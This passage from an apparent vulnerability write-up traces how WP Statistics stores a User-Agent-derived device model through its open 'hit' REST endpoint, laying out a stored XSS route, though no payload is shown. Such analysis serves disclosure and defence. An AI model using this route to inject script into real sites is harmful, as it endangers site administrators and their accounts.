&amp;#39;visits&amp;#39;   =&amp;gt; $this-&amp;gt;visitorsModel-&amp;gt;countColumnDistinct(array_merge($args, [&amp;#39;field&amp;#39; =&amp;gt; &amp;#39;ID&amp;#39;])),&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We focus on &lt;code&gt;$visitors&lt;/code&gt; because it is iterated and displayed in &lt;code&gt;models.php&lt;/code&gt;{: .filepath}&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php foreach ($data[&amp;#39;visitors&amp;#39;] as $item) : ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$visitors&lt;/code&gt; is the result of &lt;code&gt;getVisitorsDevices()&lt;/code&gt; from the &lt;code&gt;VisitorsModel&lt;/code&gt; class:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getVisitorsDevices($args = [])&#xA;{&#xA;    $args = $this-&amp;gt;parseArgs($args, [&#xA;        &amp;#39;field&amp;#39;          =&amp;gt; &amp;#39;agent&amp;#39;,&#xA;        &amp;#39;date&amp;#39;           =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;where_not_null&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;group_by&amp;#39;       =&amp;gt; [],&#xA;        &amp;#39;order_by&amp;#39;       =&amp;gt; &amp;#39;visitors&amp;#39;,&#xA;        &amp;#39;order&amp;#39;          =&amp;gt; &amp;#39;DESC&amp;#39;,&#xA;        &amp;#39;per_page&amp;#39;       =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;page&amp;#39;           =&amp;gt; 1,&#xA;    ]);&#xA;&#xA;    $result = Query::select([&#xA;        $args[&amp;#39;field&amp;#39;],&#xA;        &amp;#39;COUNT(visitor.ID) AS `visitors`&amp;#39;,&#xA;    ])&#xA;        -&amp;gt;from(&amp;#39;visitor&amp;#39;)&#xA;        -&amp;gt;whereDate(&amp;#39;last_counter&amp;#39;, $args[&amp;#39;date&amp;#39;])&#xA;        -&amp;gt;whereNotNull($args[&amp;#39;where_not_null&amp;#39;])&#xA;        -&amp;gt;groupBy($args[&amp;#39;group_by&amp;#39;])&#xA;        -&amp;gt;orderBy($args[&amp;#39;order_by&amp;#39;], $args[&amp;#39;order&amp;#39;])&#xA;        -&amp;gt;perPage($args[&amp;#39;page&amp;#39;], $args[&amp;#39;per_page&amp;#39;])&#xA;        -&amp;gt;getAll();&#xA;&#xA;    return $result ? $result : [];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getVisitorsDevices()&lt;/code&gt; queries &lt;code&gt;from(&#39;visitor&#39;)&lt;/code&gt; which is the &lt;code&gt;wp_statistics_visitor&lt;/code&gt; table in the database, and returns results.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; show tables;&#xA;&amp;#43;-------------------------------------&amp;#43;&#xA;| Tables_in_wordpress                 |&#xA;&amp;#43;-------------------------------------&amp;#43;          &#xA;| wp_statistics_visitor               |&#xA;| wp_other_table                      |&#xA;| wp_users                            |&#xA;&amp;#43;-------------------------------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;wp_statistics_visitor&lt;/code&gt; table includes the following fields:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; desc wp_statistics_visitor;&#xA;&amp;#43;----------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| Field          | Type            | Null | Key | Default | Extra          |&#xA;&amp;#43;----------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| ID             | bigint          | NO   | PRI | NULL    | auto_increment |&#xA;| last_counter   | date            | NO   | MUL | NULL    |                |&#xA;| referred       | text            | NO   |     | NULL    |                |&#xA;| agent          | varchar(180)    | NO   | MUL | NULL    |                |&#xA;| platform       | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| version        | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| device         | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| model          | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| UAString       | varchar(190)    | YES  |     | NULL    |                |&#xA;| ip             | varchar(60)     | NO   | MUL | NULL    |                |&#xA;| location       | varchar(10)     | YES  | MUL | NULL    |                |&#xA;| user_id        | bigint          | NO   |     | NULL    |                |&#xA;| hits           | int             | YES  |     | NULL    |                |&#xA;| honeypot       | int             | YES  |     | NULL    |                |&#xA;| city           | varchar(100)    | YES  |     | NULL    |                |&#xA;| region         | varchar(100)    | YES  |     | NULL    |                |&#xA;| continent      | varchar(50)     | YES  |     | NULL    |                |&#xA;| source_channel | varchar(50)     | YES  |     | NULL    |                |&#xA;| source_name    | varchar(100)    | YES  |     | NULL    |                |&#xA;| first_page     | bigint unsigned | YES  |     | NULL    |                |&#xA;| first_view     | datetime        | YES  |     | NULL    |                |&#xA;| last_page      | bigint unsigned | YES  |     | NULL    |                |&#xA;| last_view      | datetime        | YES  |     | NULL    |                |&#xA;&amp;#43;----------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Thus, &lt;code&gt;$data&lt;/code&gt; contains results from the &lt;code&gt;wp_statistics_visitor&lt;/code&gt; table (including the visitor &lt;strong&gt;model&lt;/strong&gt;) and other values. We need a way to store an &lt;strong&gt;XSS payload&lt;/strong&gt; into the &lt;code&gt;model&lt;/code&gt; field of &lt;code&gt;wp_statistics_visitor&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Luckily, while struggling with the wrong sink earlier, I found how the plugin stores visitor information into &lt;code&gt;wp_statistics_visitor&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&amp;#39;wp-statistics/v2&amp;#39;, &amp;#39;/&amp;#39; . &amp;#39;hit&amp;#39;, array(&#xA;    array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; \WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; array($this, &amp;#39;hit_callback&amp;#39;),&#xA;        &amp;#39;args&amp;#39;                =&amp;gt; self::require_params_hit(),&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; function (\WP_REST_Request $request) {&#xA;            return $this-&amp;gt;checkSignature($request);&#xA;        }&#xA;    )&#xA;));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin registers a &lt;strong&gt;REST API&lt;/strong&gt; endpoint &lt;code&gt;/wp-json/wp-statistics/v2/hit&lt;/code&gt; with &lt;code&gt;hit_callback()&lt;/code&gt; as the handler. But to use this endpoint, you must pass &lt;code&gt;checkSignature&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function checkSignature($request)&#xA;{&#xA;    if (Helper::isRequestSignatureEnabled()) {&#xA;        $signature = $request-&amp;gt;get_param(&amp;#39;signature&amp;#39;);&#xA;        $payload   = [&#xA;            $request-&amp;gt;get_param(&amp;#39;source_type&amp;#39;),&#xA;            (int)$request-&amp;gt;get_param(&amp;#39;source_id&amp;#39;),&#xA;        ];&#xA;&#xA;        if (!Signature::check($payload, $signature)) {&#xA;            return new \WP_Error(&amp;#39;rest_forbidden&amp;#39;, __(&amp;#39;Invalid signature&amp;#39;, &amp;#39;wp-statistics&amp;#39;), array(&amp;#39;status&amp;#39; =&amp;gt; 403));&#xA;        }&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These params are automatically provided when the page is loaded =&amp;gt; it always returns true. Capturing the request with &lt;strong&gt;Burp Suite&lt;/strong&gt; shows this clearly:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp-statistics/v2/hit HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; model_here) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36&#xA;&#xA;wp_statistics_hit=1&amp;amp;source_type=home&amp;amp;source_id=0&amp;amp;search_query=&amp;amp;signature=787b07b8979cb982ec89a4f103a68081&amp;amp;endpoint=hit&amp;amp;referred=&amp;amp;page_uri=Lw%3D%3D&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Therefore, we do not need to worry about &lt;code&gt;permission_callback&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Returning to &lt;code&gt;hit_callback()&lt;/code&gt;, this is the main function that handles saving visitor information.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function hit_callback()&#xA;{&#xA;    $statusCode = false;&#xA;&#xA;    try {&#xA;        Helper::validateHitRequest();&#xA;        Hits::record();&#xA;&#xA;        $responseData[&amp;#39;status&amp;#39;] = true;&#xA;&#xA;    } catch (Exception $e) {&#xA;        $responseData[&amp;#39;status&amp;#39;] = false;&#xA;        $responseData[&amp;#39;data&amp;#39;]   = $e-&amp;gt;getMessage();&#xA;        $statusCode             = $e-&amp;gt;getCode();&#xA;    }&#xA;&#xA;    $response = rest_ensure_response($responseData);&#xA;&#xA;    if ($statusCode) {&#xA;        $response-&amp;gt;set_status($statusCode);&#xA;    }&#xA;&#xA;    $response-&amp;gt;set_headers(array(&#xA;        &amp;#39;Cache-Control&amp;#39; =&amp;gt; &amp;#39;no-cache&amp;#39;,&#xA;    ));&#xA;&#xA;    return $response;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The issue is related to the user-agent header and the model parsed from it — we need to find how to add model data into the database. &lt;a href=&#34;https://51degrees.com/blog/understanding-user-agent-string#Unpacking%20the%20User%20Agent%20string&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;This&lt;/a&gt; shows the structure of user-agent strings which can include model information.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Helper::validateHitRequest();&#xA;public static function validateHitRequest()&#xA;{&#xA;    $isValid = Request::validate([&#xA;        &amp;#39;page_uri&amp;#39;     =&amp;gt; [&#xA;            &amp;#39;required&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;type&amp;#39;            =&amp;gt; &amp;#39;string&amp;#39;,&#xA;            &amp;#39;encoding&amp;#39;        =&amp;gt; &amp;#39;base64&amp;#39;,&#xA;            &amp;#39;invalid_pattern&amp;#39; =&amp;gt; self::injectionPatterns()&#xA;        ],&#xA;        &amp;#39;search_query&amp;#39; =&amp;gt; [&#xA;            &amp;#39;required&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;type&amp;#39;            =&amp;gt; &amp;#39;string&amp;#39;,&#xA;            &amp;#39;encoding&amp;#39;        =&amp;gt; &amp;#39;base64&amp;#39;,&#xA;            &amp;#39;invalid_pattern&amp;#39; =&amp;gt; self::injectionPatterns()&#xA;        ],&#xA;        &amp;#39;source_id&amp;#39;    =&amp;gt; [&#xA;            &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;number&amp;#39;,&#xA;            &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39; =&amp;gt; false&#xA;        ],&#xA;        &amp;#39;referred&amp;#39;     =&amp;gt; [&#xA;            &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;url&amp;#39;,&#xA;            &amp;#39;encoding&amp;#39; =&amp;gt; &amp;#39;base64&amp;#39;&#xA;        ],&#xA;    ]);&#xA;&#xA;    if (!$isValid) {&#xA;        do_action(&amp;#39;wp_statistics_invalid_hit_request&amp;#39;, $isValid, IP::getIP());&#xA;        throw new ErrorException(esc_html__(&amp;#39;Invalid hit/online request.&amp;#39;, &amp;#39;wp-statistics&amp;#39;));&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;validateHitRequest()&lt;/code&gt; validates parameters in the request body for the &lt;code&gt;hit&lt;/code&gt; endpoint; these params are provided by the plugin itself, so they do not affect the model parsed from the user-agent header.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Hits::record();&#xA;public static function record($visitorProfile = null)&#xA;{&#xA;    if (!$visitorProfile) {&#xA;        $visitorProfile = new VisitorProfile();&#xA;    }&#xA;&#xA;    /**&#xA;        * Record Pages&#xA;        */&#xA;    $pageId = false;&#xA;    if (Pages::active()) {&#xA;        $pageId = Pages::record($visitorProfile);&#xA;    }&#xA;&#xA;    /**&#xA;        * Record Visitor Detail&#xA;        */&#xA;    $visitorId = false;&#xA;    if (Visitor::active()) {&#xA;        $visitorId = Visitor::record($visitorProfile, [&amp;#39;page_id&amp;#39; =&amp;gt; $pageId]);&#xA;    }&#xA;&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;record&lt;/code&gt; keyword suggests storing visitor details into the database.&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;visitor=null&lt;/code&gt; (i.e., not existing) it calls &lt;code&gt;Visitor::active()&lt;/code&gt; to check and then &lt;code&gt;record()&lt;/code&gt; for the &lt;strong&gt;Visitor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function active()&#xA;{&#xA;    return (has_filter(&amp;#39;wp_statistics_active_visitors&amp;#39;)) ? apply_filters(&amp;#39;wp_statistics_active_visitors&amp;#39;, true) : true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;active()&lt;/code&gt; returns &lt;strong&gt;true by default&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If a filter &lt;code&gt;add_filter(&#39;wp_statistics_active_visitors&#39;, &#39;my_function&#39;)&lt;/code&gt; exists, the return value may change according to the filter.&lt;/li&gt;&#xA;&lt;li&gt;If no filter is added, it just returns &lt;strong&gt;true&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;A search for the hook name &lt;code&gt;wp_statistics_active_visitors&lt;/code&gt; found no filter additions.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/search2.png&#39; alt=&#34;Kết quả tìm kiếm hook name wp\_statistics\_active\_visitors&#34; height=&#34;233&#34; width=&#34;588&#34;&gt;&#xA;&lt;em&gt;Search results for hook name wp_statistics_active_visitors&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 &lt;code&gt;active()&lt;/code&gt; is always true =&amp;gt; &lt;code&gt;Visitor::record()&lt;/code&gt; is invoked.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt; public static function record($visitorProfile, $arg = array())&#xA;{&#xA;    global $wpdb;&#xA;&#xA;    // Define the array of defaults&#xA;    $defaults = array(&#xA;        &amp;#39;location&amp;#39;         =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;exclusion_match&amp;#39;  =&amp;gt; false,&#xA;        &amp;#39;exclusion_reason&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;page_id&amp;#39;          =&amp;gt; 0&#xA;    );&#xA;&#xA;    $userAgent    = $visitorProfile-&amp;gt;getUserAgent(); &amp;lt;-- focus&#xA;    $same_visitor = $visitorProfile-&amp;gt;isIpActiveToday();&#xA;&#xA;    // If we have a new Visitor in Day&#xA;    if (!$same_visitor) {&#xA;&#xA;        // Prepare Visitor information&#xA;        $visitor = array(&#xA;            &amp;#39;agent&amp;#39;          =&amp;gt; $userAgent-&amp;gt;getBrowser(),&#xA;            &amp;#39;platform&amp;#39;       =&amp;gt; $userAgent-&amp;gt;getPlatform(),&#xA;            &amp;#39;version&amp;#39;        =&amp;gt; $userAgent-&amp;gt;getVersion(),&#xA;            &amp;#39;device&amp;#39;         =&amp;gt; $userAgent-&amp;gt;getDevice(),&#xA;            &amp;#39;model&amp;#39;          =&amp;gt; $userAgent-&amp;gt;getModel(), &amp;lt;-- focus&#xA;            // other logic&#xA;        );&#xA;&#xA;        $visitor = apply_filters(&amp;#39;wp_statistics_visitor_information&amp;#39;, $visitor);&#xA;&#xA;        //Save Visitor TO DB&#xA;        $visitor_id = self::save_visitor($visitor, $visitorProfile);&#xA;&#xA;    } else {&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin takes the user-agent from the HTTP request and assigns it to &lt;code&gt;$userAgent&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;![Debug cho &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mn&gt;1.&lt;/mn&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;userAgent](debug1.png)&#xA;*Debugging &lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;ser&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;ug&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1.&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8889em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;De&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;ugg&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;userAgent*&lt;/p&gt;&#xA;&lt;p&gt;Then it assigns fields to the &lt;code&gt;$visitor&lt;/code&gt; array and saves the visitor info to the database using &lt;code&gt;save_visitor()&lt;/code&gt;. We must focus on the line containing model:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;model&amp;#39; =&amp;gt; $userAgent-&amp;gt;getModel()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;includes/class-wp-statistics-visitor.php v14.15.4&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;&#39;model&#39;&lt;/code&gt; is the return value of &lt;code&gt;getModel()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getModel()&#xA;{&#xA;    $model = &amp;#39;&amp;#39;;&#xA;&#xA;    if (! empty($this-&amp;gt;deviceDetector)) {&#xA;        $brand  = $this-&amp;gt;deviceDetector-&amp;gt;getBrandName();&#xA;        $device = $this-&amp;gt;deviceDetector-&amp;gt;getModel();&#xA;&#xA;        if (!empty($device)) {&#xA;            $words = explode(&amp;#39; &amp;#39;, trim($device));&#xA;            $device = $words[0] ?? null;&#xA;&#xA;            if (! empty($device) &amp;amp;&amp;amp; ctype_digit($device)) {&#xA;                $device = &amp;#39;&amp;#39;;&#xA;            }&#xA;        }&#xA;&#xA;        $model = trim($brand . &amp;#39; &amp;#39; . $device);&#xA;    }      &#xA;&#xA;    return $model ?? null;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The logic in &lt;code&gt;getModel()&lt;/code&gt; depends on &lt;code&gt;deviceDetector&lt;/code&gt; which is initialized in &lt;code&gt;__construct&lt;/code&gt;; we need to identify what that is:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class UserAgentService&#xA;{&#xA;    public function __construct()&#xA;    {&#xA;        try {&#xA;            // Get HTTP User Agent&#xA;            $userAgent = UserAgent::getHttpUserAgent();&#xA;&#xA;            // Initialize DeviceDetector with the user agent string&#xA;            $this-&amp;gt;deviceDetector = new \WP_Statistics\Dependencies\DeviceDetector\DeviceDetector($userAgent);&#xA;            $this-&amp;gt;deviceDetector-&amp;gt;parse();&#xA;&#xA;        } catch (Exception $e) {&#xA;            // In case of an error, set deviceDetector to null&#xA;            $this-&amp;gt;deviceDetector = null;&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;deviceDetector&lt;/code&gt; is an instance of class &lt;code&gt;DeviceDetector&lt;/code&gt;, initialized with the &lt;code&gt;$userAgent&lt;/code&gt; string from the HTTP request.&lt;/p&gt;&#xA;&lt;p&gt;![Debug cho &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mn&gt;2.&lt;/mn&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;userAgent](debug2.png)&#xA;*Debugging &lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;ser&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;ug&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2.&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8889em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;De&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;ugg&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;userAgent*&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class DeviceDetector &#xA;{&#xA;    public function __construct(string $userAgent = &amp;#39;&amp;#39;, ?ClientHints $clientHints = null)&#xA;    {&#xA;        if (&amp;#39;&amp;#39; !== $userAgent) {&#xA;            $this-&amp;gt;setUserAgent($userAgent);&#xA;        }&#xA;&#xA;        if ($clientHints instanceof ClientHints) {&#xA;            $this-&amp;gt;setClientHints($clientHints);&#xA;        }&#xA;&#xA;        $this-&amp;gt;addClientParser(new FeedReader());&#xA;        $this-&amp;gt;addClientParser(new MobileApp());&#xA;        $this-&amp;gt;addClientParser(new MediaPlayer());&#xA;        $this-&amp;gt;addClientParser(new PIM());&#xA;        $this-&amp;gt;addClientParser(new Browser());&#xA;        $this-&amp;gt;addClientParser(new Library());&#xA;&#xA;        $this-&amp;gt;addDeviceParser(new HbbTv());&#xA;        $this-&amp;gt;addDeviceParser(new ShellTv());&#xA;        